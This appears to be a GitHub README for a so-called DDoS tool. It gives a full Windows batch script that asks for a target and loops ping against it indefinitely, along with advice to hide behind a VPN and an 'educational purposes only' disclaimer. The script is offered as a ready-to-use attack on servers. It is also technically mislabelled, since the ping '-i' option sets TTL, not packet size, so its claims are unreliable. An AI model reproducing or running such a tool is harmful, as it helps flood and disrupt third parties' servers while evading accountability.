# DDOS-Tool
Anonymous DDOS-Tool





# About
  
 A script to Attack http(s) servers                                                
 
make sure u have a vpn installed                

how to install a vpn here: https://youtu.be/te8KE71ndso



# Screenshot
![Unbenannt](https://user-images.githubusercontent.com/97392345/153496914-2f9daae4-6c52-42c6-83b3-5df5f23ee946.PNG)


# Install
 1) Copy the folllowing code to youre Notepad:
 
@echo off

mode 67,16

title DDOS Attack by MR Jack

color 0a

cls

echo.

echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

echo DDOS With Batchfile

echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

echo.


set /p x=Server-Target:


echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ping %x%

echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

@ping.exe 127.0.0.1 -n 5 -w 1000 > nul

goto Next 

:Next

echo.

echo.

echo.

set /p m=ip Host:

echo.

set /p n=Packet Size:

echo.

:DDOS

color 0c

echo Attacking Server %m%

ping %m% -i %n% -t >nul

goto DDOS

2) when u are in the notepad dont forget to remove the Spaces of the code otherwise it wont work

3) enter the target server, the ip and how many packets u want to send to the Server


Enjoy


# Disclaimer  
im not responsible for any Damage caused with this Tool. use it only for educational purposes only.  
